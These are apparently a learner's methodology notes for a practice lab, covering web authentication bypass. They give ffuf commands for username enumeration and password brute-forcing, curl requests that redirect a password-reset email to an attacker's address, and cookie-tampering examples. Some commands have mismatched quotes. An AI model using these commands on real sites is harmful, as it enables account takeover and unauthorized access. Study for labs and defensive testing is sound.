# **_Authentication Bypass Methodology_**

# 1. Authentication Bypass
## Username Enumeration
- `ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <URL>customers/signup -mr "username already exists"`
    * `-w` -> input path to wordlist
    * `-X` -> Request method eg: POST, GET, PUT.
    * `-d` -> input data parameters (eg: username, password,email..etc)
    * `-H` -> Input the headers (eg: Content-Type: application/x-www-form-urlencoded , Content-Type: application/json {Use when you input data in JSON format} )
    * `-u` -> Enter the URL
    * `-mr` -> to match the regexp
## Bruteforce
- `ffuf -w username.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <URL>/customers/login -fc 200`
    * `-w` -> input path to wordlist
       - You can assign the different username and password list to each fild by giving any variable names, here username.txt:W1 (username.txt -> username list ;  :W1 -> used to assign variable)
       - Same for password wordlist (/path/to/password.txt -> password file ; :W2 -> assigned variable)
    * `-X` -> Request method eg: POST, GET, PUT.
    * `-d` -> input data parameters (eg: username, password,email..etc)
    * `-fc` -> filters(shows) the only code which you mention
## Logical Flaw
For demonstration purposes, we'll use the email address robert@acmeitsupport.thm which is accepted. We're then presented with the next stage of the form, which asks for the username associated with this login email address. If we enter robert as the username and press the Check Username button, you'll be presented with a confirmation message that a password reset email will be sent to robert@acmeitsupport.thm.

For the valid password request message the curl command will be 
   * `curl <url>/customers/reset?email=robert%40acmeitsupport.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=robert"`

[] Check if other email value is also accepted when sent with the valid username and email
   * `curl <url>/customers/reset?email=robert%40acmeitsupport.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=robert&email=<attacker_email>"`

If it accepts the email and sends the password reset link then CONGRATULATONS!!🎊🎊 it is authentication bypass vulnerability

## Cookie Tampering
use the curl command and the `-H ` to tamper the cookies
   * eg: `curl -H "Cookie: logged_in=true; is_admin=flase" <url>`
somtimes cookies can be in encoded form, just decode them and you can easily understand them.
